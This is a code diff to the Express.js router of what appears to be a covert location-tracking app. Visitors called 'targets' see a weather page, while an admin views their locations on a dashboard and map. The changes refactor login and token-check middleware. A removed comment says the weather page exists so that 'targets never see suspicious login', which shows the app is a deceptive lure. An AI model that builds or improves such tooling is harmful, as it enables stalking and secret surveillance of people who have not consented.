@@ -43,8 +43,9 @@ router.route("/login").get((req, res) => {
     const { username, password } = req.body
     if (config.username === username && config.password === password) {
         res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
+        return res.redirect("/")
     }
-    res.redirect("/")
+    res.redirect("/login")
 })
 
 router.route("/weather").get((req, res) => {
@@ -164,7 +165,18 @@ router.get("/api/reverse-geocode", async (req, res) => {
     })
 })
 
-function renderDashboard(req, res) {
+// Token checking middleware: restricts everything below to Admin only
+router.use(function checkToken(req, res, next) {
+    const token = req.cookies.token
+    if (token != null && token === config.token) {
+        next()
+    } else {
+        res.clearCookie("token").redirect("/login")
+    }
+})
+
+// Admin Dashboard (requires login)
+router.route("/").get((req, res) => {
     const targetsForMap = {}
     for (const [id, val] of Object.entries(TARGETS)) {
         targetsForMap[id] = val.current || val
@@ -173,36 +185,10 @@ function renderDashboard(req, res) {
         TARGETS,
         targetsMapJson: JSON.stringify(targetsForMap)
     })
-}
-
-// Admin / Dashboard route - requires authentication
-router.route("/admin").get((req, res) => {
-    const token = req.cookies.token
-    if (token != null && token === config.token) {
-        renderDashboard(req, res)
-    } else {
-        res.redirect("/login")
-    }
-})
-
-// Root URL:
-// - If logged in as admin: opens Dashboard
-// - If regular visitor / target: opens Weather tracker (so targets never see suspicious login!)
-router.route("/").get((req, res) => {
-    const token = req.cookies.token
-    if (token != null && token === config.token) {
-        renderDashboard(req, res)
-    } else {
-        res.render("weather")
-    }
 })
 
 // Map page: requires admin authentication
 router.route("/map").get((req, res) => {
-    const token = req.cookies.token
-    if (token !== config.token) {
-        return res.clearCookie("token").redirect("/login")
-    }
     const { id } = req.query
     const target = TARGETS[id]
     res.render("map", {
